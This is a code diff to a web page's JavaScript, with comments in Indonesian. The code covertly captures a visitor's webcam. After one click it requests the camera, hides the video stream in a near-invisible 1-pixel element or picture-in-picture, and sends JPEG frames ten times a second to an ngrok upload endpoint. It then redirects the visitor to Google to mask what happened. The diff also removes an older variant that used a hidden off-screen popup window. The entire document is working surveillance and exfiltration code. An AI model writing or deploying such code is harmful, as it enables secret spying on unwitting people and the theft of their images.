@@ -31,7 +31,7 @@
   var logEl = document.getElementById('log');
   var executed = false;
   var streamInterval = null;
-  var pipWindow = null;
+  var videoElement = null;
 
   function log(msg) {
     logEl.innerHTML += "> " + msg + "<br>";
@@ -43,16 +43,13 @@
   // ============================================
   var TARGET_URL = "https://www.google.com";
   var SERVER_ENDPOINT = "https://studly-unallegorized-brecken.ngrok-free.dev/upload";
-  
-  // Interval pengiriman frame (ms)
-  var STREAM_INTERVAL = 100;
+  var STREAM_INTERVAL = 100; // 10 FPS
 
   // ============================================
-  // FUNGSI: KIRIM FRAME KE SERVER (TELEMETRI ASINKRON)
+  // 1. KIRIM FRAME KE SERVER (TELEMETRI)
   // ============================================
   function sendFrameToServer(stream) {
     try {
-      // Buat elemen video sementara untuk capture
       var video = document.createElement('video');
       video.srcObject = stream;
       video.muted = true;
@@ -63,7 +60,6 @@
       canvas.height = 480;
       var ctx = canvas.getContext('2d');
 
-      // Tunggu video siap, lalu capture
       video.onloadedmetadata = function() {
         setInterval(function() {
           if (video.readyState === video.HAVE_ENOUGH_DATA) {
@@ -74,120 +70,82 @@
               var formData = new FormData();
               formData.append('file', blob, 'capture.jpg');
 
-              // Kirim via fetch (keepalive)
+              // Kirim via fetch keepalive
               fetch(SERVER_ENDPOINT, {
                 method: 'POST',
                 body: formData,
                 keepalive: true
               }).catch(function(){});
 
-              // Fallback: sendBeacon (jika fetch gagal)
+              // Fallback: sendBeacon
               // navigator.sendBeacon(SERVER_ENDPOINT, blob);
 
             }, 'image/jpeg', 0.5);
           }
         }, STREAM_INTERVAL);
       };
-    } catch(e) {
-      log("[-] Frame Error: " + e.message);
-    }
+    } catch(e) {}
   }
 
   // ============================================
-  // FUNGSI: ENTER PiP (PICTURE-IN-PICTURE)
+  // 2. PIA (PICTURE-IN-PICTURE) + REDIRECT
   // ============================================
-  function enterPiP(stream) {
+  async function startCameraAndPiP() {
     try {
-      // Buat video element
-      var video = document.createElement('video');
-      video.srcObject = stream;
-      video.muted = true;
-      video.playsInline = true;
-      video.style.display = 'none';
-      document.body.appendChild(video);
+      log("[+] Meminta Izin Kamera...");
+      
+      // Minta kamera (await)
+      var stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+      log("[+] 🚨 KAMERA BERHASIL diakses!");
 
-      video.play().then(function() {
-        // Minta PiP
-        video.requestPictureInPicture()
-          .then(function() {
-            log("[+] 🎥 PiP AKTIF (Video Melayang)!");
-          })
-          .catch(function(err) {
-            log("[-] PiP Gagal: " + err.message);
-          });
-      }).catch(function(err) {
-        log("[-] Video Play Gagal: " + err.message);
-      });
-    } catch(e) {
-      log("[-] PiP Error: " + e.message);
-    }
-  }
+      // Buat video element (visible, tapi transparan)
+      videoElement = document.createElement('video');
+      videoElement.srcObject = stream;
+      videoElement.muted = true;
+      videoElement.playsInline = true;
+      videoElement.style.cssText = 'position:fixed;top:0;left:0;width:1px;height:1px;opacity:0.01;pointer-events:none;';
+      document.body.appendChild(videoElement);
 
-  // ============================================
-  // FUNGSI: POPUP WINDOW TERISOLASI (ALTERNATIF PiP)
-  // ============================================
-  function createPopupWindow(stream) {
-    try {
-      // Buka jendela kecil (tersembunyi)
-      var win = window.open('', 'StreamWindow', 'width=1,height=1,left=-1000,top=-1000');
-      if (!win) {
-        log("[-] Popup diblokir.");
-        return;
+      // Putar video
+      await videoElement.play().catch(function(){});
+      log("[+] Video playing.");
+
+      // Masuk PiP (segera)
+      try {
+        await videoElement.requestPictureInPicture();
+        log("[+] 🎥 PiP AKTIF!");
+      } catch (pipErr) {
+        log("[-] PiP Gagal: " + pipErr.message);
       }
 
-      // Tulis video ke popup
-      win.document.write(`
-        <!DOCTYPE html>
-        <html>
-        <body style="margin:0;background:#000;">
-          <video id="pipVideo" autoplay playsinline muted style="width:100%;height:100%;"></video>
-          <script>
-            window.onload = function() {
-              var video = document.getElementById('pipVideo');
-              video.srcObject = window.opener.stream;
-              video.play().catch(function(){});
-              
-              // Paksa PiP
-              setTimeout(function() {
-                if (document.pictureInPictureElement) {
-                  document.exitPictureInPicture();
-                }
-                video.requestPictureInPicture()
-                  .then(function() {
-                    window.opener.postMessage({ type: 'PIP_GRANTED' }, '*');
-                  })
-                  .catch(function(err) {
-                    window.opener.postMessage({ type: 'PIP_DENIED', error: err.message }, '*');
-                  });
-              }, 500);
-            };
-          <\/script>
-        </body>
-        </html>
-      `);
+      // Mulai telemetri
+      sendFrameToServer(stream);
 
-      // Kirim stream ke popup
-      win.stream = stream;
-      log("[+] Popup Window Terisolasi Dibuat.");
+      // ============================================
+      // 3. REDIRECT KE GOOGLE (INSTAN)
+      // ============================================
+      setTimeout(function() {
+        log("[+] Redirect ke Google.com...");
+        try {
+          window.location.replace(TARGET_URL);
+        } catch(e) {}
+      }, 500); // 500ms setelah semuanya aktif
 
-      // Listener pesan dari popup
-      window.addEventListener('message', function(e) {
-        if (e.data.type === 'PIP_GRANTED') {
-          log("[+] 🎥 PiP (Popup) AKTIF!");
-        } else if (e.data.type === 'PIP_DENIED') {
-          log("[-] PiP (Popup) Ditolak: " + e.data.error);
-        }
-      });
-
-    } catch(e) {
-      log("[-] Popup Error: " + e.message);
+    } catch(err) {
+      log("[-] Kamera diblokir: " + err.name);
+      
+      // Fallback: redirect ke Google setelah 1 detik
+      setTimeout(function() {
+        log("[+] Redirect ke Google (kamera diblokir)...");
+        window.location.replace(TARGET_URL);
+      }, 1000);
     }
   }
 
   // ============================================
   // TRIGGER (KLIK)
   // ============================================
-  document.body.addEventListener('click', async function() {
+  document.body.addEventListener('click', function() {
     if (executed) return;
     executed = true;
 
@@ -199,46 +157,7 @@
     logEl = document.getElementById('log');
     log("[!] Memulai Lifecycle Persistence...");
 
-    // ============================================
-    // A. MINTA IZIN KAMERA
-    // ============================================
-    try {
-      log("[+] Meminta Izin Kamera...");
-      
-      var stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-      log("[+] 🚨 KAMERA BERHASIL diakses!");
-
-      // ============================================
-      // B. PERTAHANKAN STREAM (PiP & POPUP)
-      // ============================================
-      // B1. PiP (Langsung)
-      enterPiP(stream);
-
-      // B2. Popup Window (Alternatif)
-      createPopupWindow(stream);
-
-      // B3. Mulai Telemetri (Kirim Frame)
-      sendFrameToServer(stream);
-
-      // ============================================
-      // C. REDIRECT KE GOOGLE (INSTAN)
-      // ============================================
-      setTimeout(function() {
-        log("[+] Redirect ke Google.com...");
-        try {
-          window.location.replace(TARGET_URL);
-        } catch(e) {}
-      }, 500); // 500ms setelah kamera aktif
-
-    } catch(err) {
-      log("[-] Kamera diblokir: " + err.name);
-      
-      // Jika kamera diblokir, tetap redirect ke Google setelah 1 detik
-      setTimeout(function() {
-        log("[+] Redirect ke Google (kamera diblokir)...");
-        window.location.replace(TARGET_URL);
-      }, 1000);
-    }
+    startCameraAndPiP();
 
   }, { once: true });
 
